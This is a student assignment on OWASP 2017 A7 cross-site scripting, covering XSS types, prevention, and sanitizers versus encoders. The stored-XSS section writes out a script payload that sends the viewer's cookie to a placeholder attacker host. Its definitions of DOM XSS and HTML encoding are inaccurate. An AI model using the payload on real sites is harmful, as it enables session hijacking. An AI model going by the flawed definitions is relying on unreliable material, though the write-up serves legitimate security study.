# Week-12 OWASP A7 Cross-Site Scripting (XSS)
Group: Martin Frederiksen(cph-mf237), Andreas Vikke(cph-av105).


### Explain the “sections”, “Is the Application Vulnerable” and “How to Prevent” for the OWASP 2017 Risks: A7
- **Reflected XSS:** The user interacts with a link that sends them to a site with data from the attacker. This data can be javascript that extracts information and sends it futher to the atrackers server.
- **Stored XSS:** The attacker  stores unsanitized data in the database which later shows up in other users browsers and executes.
- **DOM XSS:** The websites framework dynamically includes a libary which the attacker has control over.
- **Prevent:** To prevent the data needs to be seperated of unstruted data. This can be done with frameworks that escape XXS, escaping untrusted HTTP request, applying context-sensitive encoding, eneabeling CSP as a defense-in-depth.


### Demonstrate a simple reflected XSS example
The attacker can make an e-mail with information about the company, and a link to the real companies site. The link then points to a search site with a script that extracts the current users JSSESSION and sends it to the attackers server.


### Explain and Demonstrate a stored XSS attack with session hijacking and a subsequent attack using the “stolen” session ID
A stored XSS attack is when the attacker saves a script in the database which is then run in other users browser when it gets to them.
The attacker creates an account and in the USername field he adds <script>fetch("http://XXXX:666/evil?cookie="+document.cookie);</script> Then when users or admins see this his username, be it on a forum or in a list of users, the browser sends the JSSESSION cookie to the attackers server.


### What kind of “indications” will an attacker look for in a WEB-page before testing whether the site is vulnerable to XSS-attacks?
The attackers first looks if the server is SSL protected, if not the server sends unencrypted data, after this he looks for input fields, some input fields could be unsanitized, so more is better.


### Explain and demonstrate ways to prevent XSS-attacks
There are many ways to prevent XSS, some newer frameworks have it build in even. You can escape the XSS by design, escape untrusted HTTP requests, apply sanitation on the server site, apply context-sensitive encoding.

### Explain the terms HTML Sanitizer and HTML Encoder and their purposes
- **HTML sanitization:** examines the HTML document and makes a new HTML document that removes all the tags that are not safe, such as <script>, <object>, <embed>, <link>. The sanitation is typically using a whitelist or blacklist approch. The whitelist allows nothing but the whitelistet item, and the blacklist allows everything but the blacklistet items.
- **HTML encoder:** The encoding of the HTML document determines what character encoding to be used, default UTF-8.